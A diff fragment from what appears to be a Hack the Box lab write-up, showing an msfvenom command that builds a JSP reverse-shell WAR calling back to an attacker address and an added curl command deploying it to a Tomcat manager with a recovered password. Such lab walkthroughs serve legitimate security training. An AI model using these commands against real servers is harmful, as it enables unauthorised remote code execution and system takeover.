@@ -149,3 +149,10 @@ According to this, it is possible to create a war file and deploy it to the serv
 ```CSS
 ▶ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.24 LPORT=31337 -f war > shell.war
 ```
+![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/f44669aa-d4ae-48e7-836b-7518d8d00c94)
+
+#### Deploy the Shell
+```CSS
+▶ curl -u 'tomcat:$3cureP4s5w0rd123!' http://10.10.10.194:8080/manager/text/deploy?path=/hardyboy --upload-file shell.war
+```
+
